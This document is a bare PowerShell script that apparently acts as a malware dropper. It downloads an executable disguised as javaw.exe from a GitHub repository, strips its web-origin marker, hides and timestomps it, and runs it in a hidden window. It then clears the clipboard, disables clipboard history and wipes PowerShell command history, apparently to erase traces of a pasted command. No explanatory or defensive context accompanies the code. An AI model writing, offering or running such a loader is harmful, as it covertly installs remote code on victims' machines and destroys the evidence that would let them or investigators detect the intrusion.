$s = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\javaw.exe"
Stop-Process -Name javaw -Force -EA 0
Set-ItemProperty $s Attributes Normal -Force -EA 0
Remove-Item $s -Force -EA 0
New-Item -ItemType Directory -Force -Path (Split-Path $s) | Out-Null
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
(New-Object Net.WebClient).DownloadFile(
    'https://github.com/unrefidings/weicoclient/raw/main/javaw.exe', $s)
Remove-Item "${s}:Zone.Identifier" -Force -EA 0
try { Unblock-File $s -EA 0 } catch {}
$i = Get-Item $s -Force
$i.Attributes = 'Hidden,System'
$i.LastWriteTime = [datetime]"2026-11-08 23:59"
Start-Process $s -WindowStyle Hidden
try { Clear-Clipboard -EA 0 } catch {}
reg add "HKCU\Software\Microsoft\Clipboard" /v EnableClipboardHistory `
    /t REG_DWORD /d 0 /f | Out-Null
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard\*" `
    -Recurse -Force -EA 0
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" `
    -Force -EA 0
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
